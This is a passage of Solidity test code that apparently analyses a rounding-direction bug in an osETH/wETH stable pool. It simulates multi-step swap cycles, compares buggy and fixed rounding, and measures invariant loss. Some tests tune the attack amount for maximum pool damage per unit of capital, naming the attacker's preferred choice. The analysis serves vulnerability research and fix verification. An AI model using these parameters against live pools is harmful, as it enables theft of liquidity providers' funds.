        // Sweep D along the (W, O=2) line near the curve's true hypothetical
        emit log_string("=== D sweep along O=2, varying W ===");
        uint256[16] memory Ws = [
            uint256(500000), 800000, 950000, 999000, 999500, 999700,
            999782, 999800, 999820, 999845, 999900, 1000000,
            1010000, 1050000, 1100000, 1200000
        ];
        for (uint256 i = 0; i < Ws.length; i++) {
            uint256[] memory pp = new uint256[](2);
            pp[0] = Ws[i]; pp[1] = 2;
            try this.ext_invUp(pp, sf, amp) returns (uint256 d) {
                emit log_named_uint(string(abi.encodePacked("  D at W=", _u(Ws[i]), ", O=2")), d);
            } catch {
                emit log_named_string(string(abi.encodePacked("  D at W=", _u(Ws[i]), ", O=2")), "REVERT");
            }
        }

        // Now FIXED Step B: same Step A start, but use mulUp on OUT amount.
        emit log_string("=== FIXED (mulUp) Step B from same Step A end ===");
        uint256[] memory bal = new uint256[](2);
        bal[0] = 67000; bal[1] = 67000;
        bal = simSwapGivenOut(bal, sf, 0, 1, 67000 - 17 - 1, amp, fee, 0); // Step A (buggy mode is fine here, A doesn't trip the leak)
        emit log_named_uint("after Step A: W", bal[0]);
        emit log_named_uint("after Step A: O", bal[1]);
        emit log_named_uint("after Step A: D", invUp(bal, sf, amp));

        uint256 W_pre = bal[0];
        uint256 D_pre = invUp(bal, sf, amp);
        // FIXED: mulUp on OUT
        uint256[] memory balF = _copy(bal);
        balF = simSwapGivenOut(balF, sf, 0, 1, 17, amp, fee, 1);
        emit log_named_uint("FIXED Step B: amountIn paid", balF[0] - W_pre);
        emit log_named_uint("FIXED Step B: W_post", balF[0]);
        emit log_named_uint("FIXED Step B: O_post", balF[1]);
        try this.ext_invUp(balF, sf, amp) returns (uint256 d) {
            emit log_named_uint("FIXED Step B: D_post", d);
            emit log_named_int("FIXED Step B: dD", int256(d) - int256(D_pre));
        } catch {
            emit log_string("FIXED Step B: D_post = REVERT (invariant didn't converge)");
        }

        // BUGGY for direct comparison
        uint256[] memory balB = _copy(bal);
        balB = simSwapGivenOut(balB, sf, 0, 1, 17, amp, fee, 0);
        emit log_named_uint("BUGGY Step B: amountIn paid", balB[0] - W_pre);
        emit log_named_uint("BUGGY Step B: W_post", balB[0]);
        emit log_named_uint("BUGGY Step B: O_post", balB[1]);
        uint256 d_buggy = invUp(balB, sf, amp);
        emit log_named_uint("BUGGY Step B: D_post", d_buggy);
        emit log_named_int("BUGGY Step B: dD", int256(d_buggy) - int256(D_pre));
    }

    function ext_invUp(uint256[] memory bal, uint256[] memory sf, uint256 amp)
        external pure returns (uint256)
    {
        return invUp(bal, sf, amp);
    }

    function _u(uint256 n) internal pure returns (string memory) {
        return vm.toString(n);
    }

    // Full A/B/C step trace: print D, W, O before and after each sub-step
    // for `cycles` cycles. Lets us see how Step A and Step C move D vs Step B.
    function testDiag_stepTrace_trick17() public {
        _stepTrace(17, 67000, 3);
    }

    function testDiag_stepTrace_trick1() public {
        _stepTrace(1, 67000, 2);
    }

    function _stepTrace(uint256 trickAmt, uint256 initBalance, uint256 cycles) internal {
        IPool(osETH_wETH_d).updateTokenRateCache(0xf1C9acDc66974dFB6dEcB12aA385b9cD01190E38);
        uint256[] memory rawSf = IPool(osETH_wETH_d).getScalingFactors();
        (uint256 amp,,) = IPool(osETH_wETH_d).getAmplificationParameter();
        uint256 fee = IPool(osETH_wETH_d).getSwapFeePercentage();

        uint256[] memory sf = new uint256[](2);
        sf[0] = rawSf[0];
        sf[1] = rawSf[2];

        uint256[] memory bal = new uint256[](2);
        bal[0] = initBalance;
        bal[1] = initBalance;
        uint256 amount = bal[1];

        emit log_named_uint("trickAmt", trickAmt);
        _logState("init", bal, sf, amp);

        for (uint256 r = 0; r < cycles; r++) {
            emit log_string("==========================================");
            emit log_named_uint("cycle", r);

            // ---- Step A ----
            uint256 D_pre = invUp(bal, sf, amp);
            uint256[] memory bal_pre_A = _copy(bal);
            bal = simSwapGivenOut(bal, sf, 0, 1, amount - trickAmt - 1, amp, fee, 0);
            uint256 D_post = invUp(bal, sf, amp);
            emit log_string("--- Step A (WETH -> osETH, drain to trickAmt+1) ---");
            emit log_named_int("  Step A: dW", int256(bal[0]) - int256(bal_pre_A[0]));
            emit log_named_int("  Step A: dO", int256(bal[1]) - int256(bal_pre_A[1]));
            emit log_named_int("  Step A: dD", int256(D_post) - int256(D_pre));
            _logState("  after A", bal, sf, amp);

            // ---- Step B ----
            D_pre = D_post;
            uint256[] memory bal_pre_B = _copy(bal);
            bal = simSwapGivenOut(bal, sf, 0, 1, trickAmt, amp, fee, 0);
            D_post = invUp(bal, sf, amp);
            emit log_string("--- Step B (WETH -> osETH, take trickAmt) ---");
            emit log_named_int("  Step B: dW", int256(bal[0]) - int256(bal_pre_B[0]));
            emit log_named_int("  Step B: dO", int256(bal[1]) - int256(bal_pre_B[1]));
            emit log_named_int("  Step B: dD", int256(D_post) - int256(D_pre));
            _logState("  after B", bal, sf, amp);

            // ---- Step C ----
            D_pre = D_post;
            uint256[] memory bal_pre_C = _copy(bal);
            uint256 want = trim(bal[0]);
            bool ok = false;
            for (uint256 j = 0; j < 5; j++) {
                try this.ext_simSwap(bal, sf, 1, 0, want, amp, fee, 0) returns (uint256[] memory nb) {
                    bal = nb; ok = true; break;
                } catch { want = want * 9 / 10; }
            }
            if (!ok) { emit log_string("Step C failed all retries"); break; }
            D_post = invUp(bal, sf, amp);
            emit log_string("--- Step C (osETH -> WETH, recycle) ---");
            emit log_named_int("  Step C: dW", int256(bal[0]) - int256(bal_pre_C[0]));
            emit log_named_int("  Step C: dO", int256(bal[1]) - int256(bal_pre_C[1]));
            emit log_named_int("  Step C: dD", int256(D_post) - int256(D_pre));
            _logState("  after C", bal, sf, amp);

            amount = bal[1];
        }
    }

    function _logState(string memory tag, uint256[] memory bal, uint256[] memory sf, uint256 amp) internal {
        emit log_named_string("state", tag);
        emit log_named_uint("    W", bal[0]);
        emit log_named_uint("    O", bal[1]);
        emit log_named_uint("    D", invUp(bal, sf, amp));
    }

    function _copy(uint256[] memory a) internal pure returns (uint256[] memory b) {
        b = new uint256[](a.length);
        for (uint256 i = 0; i < a.length; i++) b[i] = a[i];
    }

    // Focused on Step B: log curve-view vs vault-view post-state for both trickAmts.
    // We isolate Step B by first running Step A, then capturing pre-state, then
    // doing Step B and reporting the discrepancy.
    function testDiag_stepB_compare() public {
        IPool(osETH_wETH_d).updateTokenRateCache(0xf1C9acDc66974dFB6dEcB12aA385b9cD01190E38);
        uint256[] memory rawSf = IPool(osETH_wETH_d).getScalingFactors();
        (uint256 amp,,) = IPool(osETH_wETH_d).getAmplificationParameter();
        uint256 fee = IPool(osETH_wETH_d).getSwapFeePercentage();

        uint256[] memory sf = new uint256[](2);
        sf[0] = rawSf[0];
        sf[1] = rawSf[2];

        emit log_named_uint("scaling factor osETH (sf)", sf[1]);

        _stepBCompareOne(sf, amp, fee, 17);
        emit log_string("==========================================");
        _stepBCompareOne(sf, amp, fee, 1);
        emit log_string("==========================================");
        _stepBCompareOne(sf, amp, fee, 34);
        emit log_string("==========================================");
        _stepBCompareOne(sf, amp, fee, 170);
    }

    function _stepBCompareOne(uint256[] memory sf, uint256 amp, uint256 fee, uint256 trickAmt) internal {
        // Run Step A from (67000, 67000) to (W_A, trickAmt + 1)
        uint256[] memory bal = new uint256[](2);
        bal[0] = 67000;
        bal[1] = 67000;
        bal = simSwapGivenOut(bal, sf, 0, 1, 67000 - trickAmt - 1, amp, fee, 0);

        emit log_named_uint("trickAmt", trickAmt);
        emit log_named_uint("after Step A: W_raw", bal[0]);
        emit log_named_uint("after Step A: O_raw", bal[1]);
        emit log_named_uint("after Step A: O_up = floor(O_raw * sf)", bal[1].mulDown(sf[1]));
        emit log_named_uint("after Step A: D_pre", invUp(bal, sf, amp));

        // Capture exactly what Step B's curve view does internally
        uint256 O_up_pre = bal[1].mulDown(sf[1]);
        uint256 request_up_mulDown = trickAmt.mulDown(sf[1]); // BUGGY truncation
        uint256 O_up_post_curve = O_up_pre - request_up_mulDown;
        emit log_named_uint("Step B request_up = mulDown(trickAmt, sf)", request_up_mulDown);
        emit log_named_uint("Step B 'curve assumed' O_up_post", O_up_post_curve);

        // Execute Step B
        uint256 W_pre = bal[0];
        bal = simSwapGivenOut(bal, sf, 0, 1, trickAmt, amp, fee, 0);
        uint256 W_post = bal[0];
        uint256 O_raw_post = bal[1];
        uint256 O_up_post_vault = O_raw_post.mulDown(sf[1]);
        emit log_named_uint("after Step B: W_raw", W_post);
        emit log_named_uint("after Step B: amountIn paid (W gain)", W_post - W_pre);
        emit log_named_uint("after Step B: O_raw", O_raw_post);
        emit log_named_uint("after Step B: O_up (Vault, re-upscaled)", O_up_post_vault);
        try this.ext_invUp(bal, sf, amp) returns (uint256 d) {
            emit log_named_uint("after Step B: D (measured on real balances)", d);
        } catch {
            emit log_string("after Step B: D = REVERT (invariant didn't converge)");
        }

        // Discrepancy: curve thought O_up_post = X, Vault gives Y
        if (O_up_post_curve > O_up_post_vault) {
            emit log_named_uint("integer discrepancy in O_up", O_up_post_curve - O_up_post_vault);
        } else {
            emit log_named_uint("integer discrepancy in O_up", 0);
        }
    }

    // Decouple "O << W" from "O small in absolute value":
    // Fix W = 999845, sweep O over many magnitudes, measure D and dD/dO (secant).
    function testDiag_dDdO_sweep() public {
        IPool(osETH_wETH_d).updateTokenRateCache(0xf1C9acDc66974dFB6dEcB12aA385b9cD01190E38);
        (uint256 amp,,) = IPool(osETH_wETH_d).getAmplificationParameter();

        uint256[10] memory Os = [uint256(1), 2, 10, 100, 1000, 10000, 100000, 333281, 666563, 999845];
        for (uint256 i = 0; i < Os.length; i++) {
            uint256 O = Os[i];
            emit log_named_uint("--- O", O);
            emit log_named_uint("  ratio O/W * 1e6", (O * 1e6) / 999845);
            (bool ok1, uint256 D_here) = _safeInv(amp, 999845, O);
            (bool ok2, uint256 D_plus) = _safeInv(amp, 999845, O + 1);
            if (!ok1) { emit log_string("  D(W,O)        : NEWTON DIVERGED"); continue; }
            emit log_named_uint("  D(W,O)        ", D_here);
            if (!ok2) { emit log_string("  D(W,O+1)      : NEWTON DIVERGED"); continue; }
            int256 slope = int256(D_plus) - int256(D_here);
            emit log_named_int("  dD/dO (secant +1)", slope);
            emit log_named_uint("  geom D/(3O)   ", D_here / (3 * O));
        }
    }

    function _safeInv(uint256 amp, uint256 W, uint256 O) internal returns (bool, uint256) {
        uint256[] memory up = new uint256[](2);
        up[0] = W; up[1] = O;
        try this.ext_inv(amp, up) returns (uint256 d) { return (true, d); }
        catch { return (false, 0); }
    }

    function ext_inv(uint256 amp, uint256[] memory up) external pure returns (uint256) {
        return StableMath._calculateInvariant(amp, up);
    }

    // Decouple "1-unit integer gap" from "post-state O = 1".
    // Same trickAmt = 17 (always satisfies the threshold), but Step A drains to
    // different O_target, so Step B leaves the pool at different absolute O.
    // If user's claim is right (O=1 is incidental), ΔD should be similar across
    // O_target values. If our model is right (O=1 absolute matters), ΔD should
    // collapse as O_target grows, even though gap stays = 1.
    function testDiag_gapSameButO_diff() public {
        IPool(osETH_wETH_d).updateTokenRateCache(0xf1C9acDc66974dFB6dEcB12aA385b9cD01190E38);
        uint256[] memory rawSf = IPool(osETH_wETH_d).getScalingFactors();
        (uint256 amp,,) = IPool(osETH_wETH_d).getAmplificationParameter();
        uint256 fee = IPool(osETH_wETH_d).getSwapFeePercentage();

        uint256[] memory sf = new uint256[](2);
        sf[0] = rawSf[0];
        sf[1] = rawSf[2];

        uint256[6] memory O_target = [uint256(18), 100, 500, 1000, 5000, 10000];
        uint256 trickAmt = 17;
        for (uint256 i = 0; i < O_target.length; i++) {
            emit log_string("==== Step A drains to O_target ====");
            emit log_named_uint("  O_target (Step A end O_raw)", O_target[i]);

            uint256[] memory bal = new uint256[](2);
            bal[0] = 67000; bal[1] = 67000;
            // Step A: drain (67000 - O_target) osETH out
            try this.ext_simSwap(bal, sf, 0, 1, 67000 - O_target[i], amp, fee, 0) returns (uint256[] memory nb) {
                bal = nb;
            } catch { emit log_string("  Step A REVERT"); continue; }

            uint256 W_A = bal[0];
            uint256 O_A = bal[1];
            (bool okPre, uint256 D_pre) = _safeInv(amp, W_A.mulDown(sf[0]), O_A.mulDown(sf[1]));
            emit log_named_uint("  Step A done: W_A", W_A);
            emit log_named_uint("  Step A done: O_A", O_A);
            if (okPre) emit log_named_uint("  Step A done: D_pre", D_pre);

            // Compute curve view of Step B post-state
            uint256 O_up_pre = O_A.mulDown(sf[1]);
            uint256 req_up = trickAmt.mulDown(sf[1]);
            uint256 O_up_post_curve = O_up_pre - req_up;

            // Step B
            try this.ext_simSwap(bal, sf, 0, 1, trickAmt, amp, fee, 0) returns (uint256[] memory nb2) {
                bal = nb2;
            } catch { emit log_string("  Step B REVERT"); continue; }

            uint256 W_post = bal[0];
            uint256 O_post = bal[1];
            uint256 O_up_post_vault = O_post.mulDown(sf[1]);
            uint256 gap = O_up_post_curve > O_up_post_vault
                ? O_up_post_curve - O_up_post_vault : 0;

            (bool okPost, uint256 D_post) = _safeInv(amp, W_post.mulDown(sf[0]), O_up_post_vault);
            emit log_named_uint("  Step A: O_up_pre = floor(O_A*sf)", O_up_pre);
            emit log_named_uint("  Step B: req_up = mulDown(17,sf)", req_up);
            emit log_named_uint("  Step B: O_up_post (CURVE view)", O_up_post_curve);
            emit log_named_uint("  Step B: O_up_post (VAULT view)", O_up_post_vault);
            emit log_named_uint("  Step B: integer gap (curve - vault)", gap);
            emit log_named_uint("  Step B: O_post raw (ABSOLUTE)", O_post);
            emit log_named_uint("  Step B: amountIn", W_post - W_A);
            if (okPre && okPost) {
                int256 dD = int256(D_post) - int256(D_pre);
                emit log_named_int("  Step B done: dD (preserves sign)", dD);
            } else {
                emit log_string("  Step B done: dD = N/A (Newton diverged)");
            }
        }
    }

    // ---------------------------------------------------------------------
    // testDiag_diagramVerify
    //
    // Print EVERY value shown in the chain-of-causation diagram so each one
    // can be verified directly from the trace. No inference, no arithmetic
    // shortcut: every number is either (a) read from on-chain state, (b)
    // computed by the same primitive the contract uses (mulDown / mulUp /
    // _calculateInvariant / _calcInGivenOut), or (c) the live result of
    // simSwapGivenOut.
    //
    // Specifically, the following claims from the diagram are printed:
    //   - Step A end state:  W_raw, O_raw, D
    //   - Scaling factors sf[WETH], sf[osETH]
    //   - O_up_pre   = mulDown(O_raw, sf[osETH])           (claim "= 19")
    //   - req_up     = mulDown(17, sf[osETH])              (claim "= 17")
    //   - O_up_post  = O_up_pre - req_up   (curve view)    (claim "= 2")
    //   - Step B (BUGGY) result:
    //       amountIn paid                                  (claim "= 625,492")
    //       W_raw_post                                     (claim "= 999,845")
    //       O_raw_post = O_raw_pre - 17  (vault view)      (claim "= 1")
    //       O_up_post_vault = mulDown(O_raw_post, sf)
    //       integer gap = O_up_post_curve - O_up_post_vault
    //   - D measured directly on (W_raw_post, O_raw_post)  (claim "= 112,405")
    //   - FIXED (mulUp) Step B from same Step A end:
    //       amountIn paid                                  (claim "= 1,041,412")
    //       W_raw_post                                     (claim "= 1,415,765")
    //       O_raw_post                                     (claim "= 1")
    function testDiag_diagramVerify() public {
        IPool(osETH_wETH_d).updateTokenRateCache(0xf1C9acDc66974dFB6dEcB12aA385b9cD01190E38);
        uint256[] memory rawSf = IPool(osETH_wETH_d).getScalingFactors();
        (uint256 amp,,) = IPool(osETH_wETH_d).getAmplificationParameter();
        uint256 fee = IPool(osETH_wETH_d).getSwapFeePercentage();

        uint256[] memory sf = new uint256[](2);
        sf[0] = rawSf[0]; // WETH
        sf[1] = rawSf[2]; // osETH

        emit log_string("=== POOL PARAMETERS ===");
        emit log_named_uint("sf[WETH]  (1e18 means identity)", sf[0]);
        emit log_named_uint("sf[osETH] (the rate-providing token)", sf[1]);
        emit log_named_uint("amplification A", amp);
        emit log_named_uint("swap fee (1e18)", fee);

        // --- Step A: drive (67000, 67000) -> (W_A, 18) by selling 66982 osETH out
        uint256[] memory bal = new uint256[](2);
        bal[0] = 67000;
        bal[1] = 67000;
        emit log_string("=== INITIAL POOL STATE (pre Step A) ===");
        emit log_named_uint("W_raw_init", bal[0]);
        emit log_named_uint("O_raw_init", bal[1]);
        emit log_named_uint("D_init", invUp(bal, sf, amp));

        // Step A in BUGGY mode (matches PoC exactly)
        bal = simSwapGivenOut(bal, sf, 0, 1, 67000 - 17 - 1, amp, fee, 0);

        emit log_string("=== STEP A END STATE (= Step B PRE-STATE) ===");
        emit log_named_uint("W_raw_pre  (claim: 374353)", bal[0]);
        emit log_named_uint("O_raw_pre  (claim: 18)", bal[1]);
        emit log_named_uint("D_pre      (claim: 138956)", invUp(bal, sf, amp));

        // Snapshot Step A end so we can re-run Step B in two modes
        uint256[] memory bal_A = _copy(bal);

        // --- Curve internal view (BUGGY) BEFORE Step B is executed ---
        emit log_string("=== STEP B - CURVE INTERNAL VIEW (BUGGY mulDown) ===");
        uint256 O_up_pre = bal_A[1].mulDown(sf[1]);
        uint256 req_up_mulDown = uint256(17).mulDown(sf[1]);
        uint256 O_up_post_curve = O_up_pre - req_up_mulDown;
        emit log_named_uint("O_up_pre  = mulDown(O_raw_pre=18, sf)  (claim: 19)", O_up_pre);
        emit log_named_uint("req_up    = mulDown(17, sf)            (claim: 17)", req_up_mulDown);
        emit log_named_uint("O_up_post_curve = O_up_pre - req_up    (claim: 2)", O_up_post_curve);

        // --- Step B BUGGY ---
        uint256 W_pre = bal_A[0];
        uint256[] memory balB = _copy(bal_A);
        balB = simSwapGivenOut(balB, sf, 0, 1, 17, amp, fee, 0);
        emit log_string("=== STEP B END STATE - BUGGY (mulDown) ===");
        emit log_named_uint("amountIn paid  (claim: 625492)", balB[0] - W_pre);
        emit log_named_uint("W_raw_post     (claim: 999845)", balB[0]);
        emit log_named_uint("O_raw_post     (claim: 1) = O_raw_pre - 17", balB[1]);

        uint256 O_up_post_vault = balB[1].mulDown(sf[1]);
        emit log_named_uint("O_up_post_vault = mulDown(O_raw_post, sf)", O_up_post_vault);
        emit log_named_uint("integer gap = curve - vault (claim: 1)", O_up_post_curve - O_up_post_vault);

        try this.ext_invUp(balB, sf, amp) returns (uint256 d) {
            emit log_named_uint("D measured at (W_post, O_post) (claim: 112405)", d);
        } catch {
            emit log_string("D measured at (W_post, O_post) = REVERT");
        }

        // --- Step B FIXED (mulUp) for comparison ---
        uint256[] memory balF = _copy(bal_A);
        balF = simSwapGivenOut(balF, sf, 0, 1, 17, amp, fee, 1);
        emit log_string("=== STEP B END STATE - FIXED (mulUp) ===");
        emit log_named_uint("amountIn paid  (claim: 1041412)", balF[0] - W_pre);
        emit log_named_uint("W_raw_post     (claim: 1415765)", balF[0]);
        emit log_named_uint("O_raw_post     (claim: 1)", balF[1]);
        try this.ext_invUp(balF, sf, amp) returns (uint256 d) {
            emit log_named_uint("D measured at FIXED end (claim: 138956 preserved)", d);
        } catch {
            emit log_string("D measured at FIXED end = REVERT");
        }

        // --- Differences quoted in the diagram ---
        emit log_string("=== DIAGRAM DELTAS ===");
        emit log_named_uint("FIXED.W_post - BUGGY.W_post   (claim: 415920)", balF[0] - balB[0]);
        emit log_named_uint("FIXED.amountIn - BUGGY.amountIn (claim: 415920)", (balF[0] - W_pre) - (balB[0] - W_pre));
    }

    // Compare ALL trickAmt that satisfy (vault_post=1, gap=1) head-to-head
    // to determine whether 17 is truly optimal or one of multiple equivalent
    // choices. For each candidate, run full Step A (drain to trickAmt+1)
    // + Step B (take trickAmt) and report:
    //   - Step A amountIn (cost of moving pool to attack position)
    //   - Step B amountIn (cost of triggering rounding gap)
    //   - Total amountIn = capital required per cycle
    //   - dD = pool damage per cycle
    //   - Efficiency = |dD| per million amountIn
    //
    // The "best" attacker choice maximizes |dD| per unit capital.
    function testDiag_trickAmtOptimum() public {
        IPool(osETH_wETH_d).updateTokenRateCache(0xf1C9acDc66974dFB6dEcB12aA385b9cD01190E38);
        uint256[] memory rawSf = IPool(osETH_wETH_d).getScalingFactors();
        (uint256 amp,,) = IPool(osETH_wETH_d).getAmplificationParameter();
        uint256 fee = IPool(osETH_wETH_d).getSwapFeePercentage();

        uint256[] memory sf = new uint256[](2);
        sf[0] = rawSf[0];
        sf[1] = rawSf[2];
        emit log_named_uint("sf[osETH]", sf[1]);
        emit log_string("Threshold: frac(t*sf) must be >= ~0.9419 for gap=1");
        emit log_string("");

        // First enumerate the gap=1 family in 1..300 by direct calculation
        emit log_string("=== gap=1 family (vault=1) in trickAmt 1..300 ===");
        uint256 found = 0;
        for (uint256 t = 1; t <= 300 && found < 20; t++) {
            uint256 curve_post = (t + 1).mulDown(sf[1]) - t.mulDown(sf[1]);
            uint256 vault_post = uint256(1).mulDown(sf[1]);
            if (curve_post == vault_post + 1) {
                emit log_named_uint("  gap=1 trickAmt", t);
                found++;
            }
        }
        emit log_string("");

        // Now run head-to-head for the first several
        uint256[8] memory cands = [uint256(17), 34, 51, 68, 86, 103, 120, 137];

        for (uint256 i = 0; i < cands.length; i++) {
            uint256 t = cands[i];
            emit log_string("====================================================");
            emit log_named_uint("CANDIDATE trickAmt", t);

            // Step A: drain (67000 - t - 1) osETH out
            uint256[] memory bal = new uint256[](2);
            bal[0] = 67000; bal[1] = 67000;
            try this.ext_simSwap(bal, sf, 0, 1, 67000 - t - 1, amp, fee, 0) returns (uint256[] memory nb) {
                bal = nb;
            } catch { emit log_string("  Step A REVERT"); continue; }

            uint256 W_A = bal[0];
            uint256 stepA_amountIn = W_A - 67000;
            uint256 D_pre = invUp(bal, sf, amp);
            emit log_named_uint("  Step A: amountIn (W spent)", stepA_amountIn);
            emit log_named_uint("  Step A: end O_raw (= t+1)", bal[1]);
            emit log_named_uint("  Step A: D after", D_pre);

            // Step B: take trickAmt out
            try this.ext_simSwap(bal, sf, 0, 1, t, amp, fee, 0) returns (uint256[] memory nb2) {
                bal = nb2;
            } catch { emit log_string("  Step B REVERT"); continue; }

            uint256 W_post = bal[0];
            uint256 O_post = bal[1];
            uint256 stepB_amountIn = W_post - W_A;

            emit log_named_uint("  Step B: amountIn (W spent)", stepB_amountIn);
            emit log_named_uint("  Step B: end W_raw", W_post);
            emit log_named_uint("  Step B: end O_raw (claim: 1)", O_post);

            (bool ok, uint256 D_post) = _safeInv(amp, W_post.mulDown(sf[0]), O_post.mulDown(sf[1]));
            if (!ok) { emit log_string("  Step B: D measurement REVERT (Newton diverged)"); continue; }

            int256 dD = int256(D_post) - int256(D_pre);
            uint256 absDD = dD < 0 ? uint256(-dD) : uint256(dD);
            uint256 totalCost = stepA_amountIn + stepB_amountIn;

            emit log_named_uint("  Step B: D after", D_post);
            emit log_named_int("  Step B: dD (NEG = pool loss)", dD);
            emit log_named_uint("  TOTAL amountIn (Step A + Step B)", totalCost);
            // Efficiency: D damage per 1M W locked
            if (totalCost > 0) {
                emit log_named_uint("  EFFICIENCY: |dD|*1e6 / totalCost", absDD * 1e6 / totalCost);
            }
        }

        emit log_string("");
        emit log_string("Higher EFFICIENCY = attacker prefers (more D damage per W spent)");
    }

    // Can we ever construct vault_post = 1 with curve_post > 2 (i.e., gap >= 2)?
    //
    // Math says no: gap = floor((a+b)*sf) - floor(a*sf) - floor(b*sf), which is
    // the subadditivity defect of floor; this is provably in {0, 1} for any
    // positive sf and any non-negative a, b.
    //
    // Here we ENUMERATE every trickAmt from 1 to 200 with O_raw_post fixed at
    // 1 (so O_raw_pre = trickAmt + 1) and print the (curve_post, vault_post)
    // pair to confirm: gap is 0 or 1, never larger.
    //
    // Then we run the actual swaps for the gap=1 cases and compare D loss to
    // see whether trickAmt choice within the gap=1 family materially changes
    // the damage at vault=1.
    function testDiag_gapMagnitudeAtVault1() public {
        IPool(osETH_wETH_d).updateTokenRateCache(0xf1C9acDc66974dFB6dEcB12aA385b9cD01190E38);
        uint256[] memory rawSf = IPool(osETH_wETH_d).getScalingFactors();
        (uint256 amp,,) = IPool(osETH_wETH_d).getAmplificationParameter();
        uint256 fee = IPool(osETH_wETH_d).getSwapFeePercentage();

        uint256[] memory sf = new uint256[](2);
        sf[0] = rawSf[0];
        sf[1] = rawSf[2];
        emit log_named_uint("sf[osETH]", sf[1]);
        emit log_named_uint("vault_post (mulDown(1, sf))", uint256(1).mulDown(sf[1]));
        emit log_string("Sweeping trickAmt = 1..200, with O_raw_post pinned at 1");
        emit log_string("");

        // Pass 1: enumerate (curve, vault) pair for each trickAmt and report max gap
        uint256 maxGap = 0;
        uint256 countGap0 = 0;
        uint256 countGap1 = 0;
        for (uint256 t = 1; t <= 200; t++) {
            uint256 a = t;
            uint256 b = 1; // O_raw_post pinned at 1
            uint256 curve_post = (a + b).mulDown(sf[1]) - a.mulDown(sf[1]);
            uint256 vault_post = b.mulDown(sf[1]);
            uint256 gap = curve_post >= vault_post ? curve_post - vault_post : 0;
            if (gap > maxGap) maxGap = gap;
            if (gap == 0) countGap0++;
            else if (gap == 1) countGap1++;
        }
        emit log_named_uint("MAX gap observed across trickAmt=1..200", maxGap);
        emit log_named_uint("count of trickAmt with gap=0", countGap0);
        emit log_named_uint("count of trickAmt with gap=1", countGap1);
        emit log_named_uint("count of trickAmt with gap>=2", 200 - countGap0 - countGap1);

        // Pass 2: for first ~10 trickAmt values, dump (curve, vault) pair
        emit log_string("");
        emit log_string("=== Detailed (curve, vault) for trickAmt in 1..30 (vault always = 1) ===");
        for (uint256 t = 1; t <= 30; t++) {
            uint256 a = t;
            uint256 b = 1;
            uint256 curve_post = (a + b).mulDown(sf[1]) - a.mulDown(sf[1]);
            uint256 vault_post = b.mulDown(sf[1]);
            uint256 gap = curve_post >= vault_post ? curve_post - vault_post : 0;
            emit log_named_uint(string(abi.encodePacked(
                "  trickAmt=", _u(t), "  curve=", _u(curve_post),
                "  vault=", _u(vault_post), "  gap"
            )), gap);
        }

        // Pass 3: for a few trickAmt where gap = 1, actually run Step A + Step B
        // and measure D loss. This confirms whether ALL gap=1 trickAmt values
        // produce comparable damage when landing at vault=1.
        emit log_string("");
        emit log_string("=== Real swap damage (D loss) for gap=1 trickAmt at vault=1 ===");
        uint256[5] memory trickList = [uint256(17), 34, 51, 68, 86];
        for (uint256 i = 0; i < trickList.length; i++) {
            uint256 t = trickList[i];
            uint256[] memory bal = new uint256[](2);
            bal[0] = 67000; bal[1] = 67000;
            try this.ext_simSwap(bal, sf, 0, 1, 67000 - (t + 1), amp, fee, 0) returns (uint256[] memory nb) {
                bal = nb;
            } catch { emit log_named_string("  Step A REVERT trickAmt", _u(t)); continue; }

            uint256 W_A = bal[0];
            uint256 D_pre = invUp(bal, sf, amp);
            try this.ext_simSwap(bal, sf, 0, 1, t, amp, fee, 0) returns (uint256[] memory nb2) {
                bal = nb2;
            } catch { emit log_named_string("  Step B REVERT trickAmt", _u(t)); continue; }

            uint256 W_post = bal[0];
            uint256 O_post = bal[1];
            (bool ok, uint256 D_post) = _safeInv(amp, W_post.mulDown(sf[0]), O_post.mulDown(sf[1]));
            int256 dD = ok ? int256(D_post) - int256(D_pre) : int256(0);
            emit log_named_uint(string(abi.encodePacked("  trickAmt=", _u(t), "  amountIn")), W_post - W_A);
            emit log_named_int(string(abi.encodePacked("  trickAmt=", _u(t), "  dD")), dD);
        }
    }

    // Compare attack damage when the rounding gap = 1 is parked at different
    // post-state O values. Same trickAmt=17 (so request_up = 17, gap mechanism
    // identical), but Step A drains to different O_target so Step B's vault
    // post-state lands at O = 1, 2, 3, 4, 5, 6, ... instead of just 1.
    //
    // Predicted geometric scaling: dD/dO ~ D/(3*O) at the boundary, so
    //   - landing at O=1 should be the worst (largest |dD|)
    //   - landing at O=2 should be ~half as bad
    //   - landing at O=3 should be ~one-third as bad
    //   - and so on.
    function testDiag_gapAtDifferentO() public {
        IPool(osETH_wETH_d).updateTokenRateCache(0xf1C9acDc66974dFB6dEcB12aA385b9cD01190E38);
        uint256[] memory rawSf = IPool(osETH_wETH_d).getScalingFactors();
        (uint256 amp,,) = IPool(osETH_wETH_d).getAmplificationParameter();
        uint256 fee = IPool(osETH_wETH_d).getSwapFeePercentage();

        uint256[] memory sf = new uint256[](2);
        sf[0] = rawSf[0];
        sf[1] = rawSf[2];
        emit log_named_uint("scaling factor osETH (sf)", sf[1]);
        emit log_named_uint("mulDown(17, sf) (claim: 17)", uint256(17).mulDown(sf[1]));
        emit log_string("All cases use trickAmt=17 (same rounding mechanism)");
        emit log_string("Each case differs only in where Step A leaves O_raw");
        emit log_string("");

        // O_target values: pre-Step-B O_raw -> post-Step-B O_raw will be O_target-17
        uint256[7] memory O_target = [uint256(18), 19, 20, 21, 22, 25, 30];
        uint256 trickAmt = 17;

        for (uint256 i = 0; i < O_target.length; i++) {
            emit log_string("====================================================");
            emit log_named_uint("CASE: O_target (Step A end O_raw)", O_target[i]);

            // Step A: drain (67000 - O_target) osETH out
            uint256[] memory bal = new uint256[](2);
            bal[0] = 67000; bal[1] = 67000;
            try this.ext_simSwap(bal, sf, 0, 1, 67000 - O_target[i], amp, fee, 0) returns (uint256[] memory nb) {
                bal = nb;
            } catch { emit log_string("  Step A REVERT"); continue; }

            uint256 W_A = bal[0];
            uint256 O_A = bal[1];
            (bool okPre, uint256 D_pre) = _safeInv(amp, W_A.mulDown(sf[0]), O_A.mulDown(sf[1]));
            emit log_named_uint("  after Step A: W_A", W_A);
            emit log_named_uint("  after Step A: O_A (raw)", O_A);
            if (okPre) emit log_named_uint("  after Step A: D_pre", D_pre);

            // Curve internal view of Step B
            uint256 O_up_pre = O_A.mulDown(sf[1]);
            uint256 req_up = trickAmt.mulDown(sf[1]);
            uint256 O_up_post_curve = O_up_pre - req_up;
            emit log_named_uint("  Step B: O_up_pre = mulDown(O_A, sf)", O_up_pre);
            emit log_named_uint("  Step B: O_up_post (CURVE view)", O_up_post_curve);

            // Step B: take 17 osETH out
